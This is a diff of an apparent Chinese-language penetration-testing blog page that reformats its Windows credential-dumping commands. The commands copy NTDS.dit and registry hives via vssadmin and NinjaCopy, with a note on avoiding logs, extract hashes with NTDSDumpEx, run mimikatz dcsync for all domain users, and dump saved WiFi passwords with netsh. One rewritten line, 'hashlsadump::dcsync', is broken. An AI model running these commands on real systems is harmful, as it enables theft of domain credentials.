@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-13
+                    2021-09-08
                 </div>
                 
 
@@ -564,10 +564,17 @@ reg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-
 
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812181529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>vssadmin 导出 ntds.dit</p>
-<pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit# SAM 等文件也可以使用 vssadmin 导出copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit
+# SAM 等文件也可以使用 vssadmin 导出
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hiv
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hiv
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>NinjaCopy 脚本也可以，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p>
-<pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1
+Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h3 id="获取-HASH-2"><a href="#获取-HASH-2" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>NTDSDumpEx 查看 ntds.dit，下载地址：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p>
 <pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system.hiv -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -578,10 +585,21 @@ reg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-
 
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811175616.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>除了拷贝 ntds.dit 到本地外，mimikatz 也可以直接查看本机的域用户所有的账号密码，不过相对于拷贝 ntds.dit 到自己的机器上来说，直接使用 mimikatz 隐蔽性肯定就会差些了。</p>
-<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe# 直接获取 teamssix 域内所有用户 hashlsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv# 获取单个用户的详细信息lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>直接获取 teamssix 域内所有用户 </p>
+<pre class="line-numbers language-none"><code class="language-none">hashlsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获取单个用户的详细信息</p>
+<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="9、WIFI-密码"><a href="#9、WIFI-密码" class="headerlink" title="9、WIFI 密码"></a>9、WIFI 密码</h2><p>使用自带命令可直接查询</p>
-<pre class="line-numbers language-none"><code class="language-none"># 获取登录过的 WIFI 名称netsh wlan show profiles# 获取某个连接过的 WIFI 密码netsh wlan show profile name&#x3D;&quot;teamssix&quot; key&#x3D;clear# 获取所有连接过的 WIFI 密码for &#x2F;f  &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>获取登录过的 WIFI 名称</p>
+<pre class="line-numbers language-none"><code class="language-none">netsh wlan show profiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获取某个连接过的 WIFI 密码</p>
+<pre class="line-numbers language-none"><code class="language-none">netsh wlan show profile name&#x3D;&quot;teamssix&quot; key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获取所有连接过的 WIFI 密码</p>
+<pre class="line-numbers language-none"><code class="language-none">for &#x2F;f  &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812091842.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
@@ -1020,7 +1038,7 @@ reg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">172.7k</span>&nbsp;字
+                class="white-color">175.3k</span>&nbsp;字
             
             
             
